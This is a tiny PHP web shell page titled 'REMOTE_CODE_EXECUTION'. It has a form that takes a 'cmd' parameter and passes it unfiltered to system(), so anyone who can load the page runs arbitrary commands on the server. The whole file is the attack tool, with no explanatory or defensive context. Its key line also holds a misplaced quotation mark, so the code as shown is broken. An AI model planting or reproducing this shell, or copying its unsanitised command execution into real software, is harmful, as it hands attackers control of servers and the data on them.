<html>
<title>RCE</title>
<h1><center>REMOTE_CODE_EXECUTION</center></h1>
<h1><center>Give Your Command</center></h1>
<center>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="20">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd]');
    }
?>
</pre>
</body>
</center>
</html>

